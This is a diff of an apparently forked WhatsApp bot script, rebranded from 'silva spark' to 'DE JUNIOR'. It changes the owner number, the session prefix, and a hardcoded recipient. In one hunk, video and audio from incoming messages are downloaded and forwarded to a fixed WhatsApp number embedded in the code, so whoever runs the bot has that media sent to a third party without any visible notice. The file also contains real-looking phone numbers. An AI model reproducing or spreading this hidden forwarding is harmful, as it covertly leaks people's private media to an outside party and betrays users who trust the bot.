@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['254700143167']
+  const ownerNumber = ['254704009677']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -65,7 +65,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("Silva~", '');
+const sessdata = config.SESSION_ID.replace("Junior~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -148,10 +148,10 @@ console.log("Session downloaded ✅")
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254704009677@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254704009677@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -526,7 +526,7 @@ console.log("Session downloaded ✅")
          
   //================ownerreact==============
   
-  if(senderNumber.includes("254700143167")){
+  if(senderNumber.includes("254704009677")){
   if(isReact) return
   m.react("🦄")
   }
@@ -612,7 +612,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("silva spark RUNNING ✅");
+  res.send("DE JUNIOR RUNNING ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
